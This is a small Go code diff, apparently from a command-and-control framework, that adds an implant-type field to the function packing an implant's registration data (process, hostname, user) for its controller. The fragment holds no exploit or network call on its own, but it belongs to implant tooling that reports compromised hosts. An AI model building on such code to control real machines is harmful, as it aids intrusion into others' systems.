@@ -30,6 +30,7 @@ func PackRegistration(i *implant.ImplantMetadata, key, iv [16]byte) []byte {
 		[]byte(i.Proc),
 		[]byte(i.Hostname),
 		[]byte(i.User),
+		[]byte(i.Impl),
 	}, internal.SEP)
 
 	binary.Write(buff, binary.BigEndian, uint16(len(dataSection)))
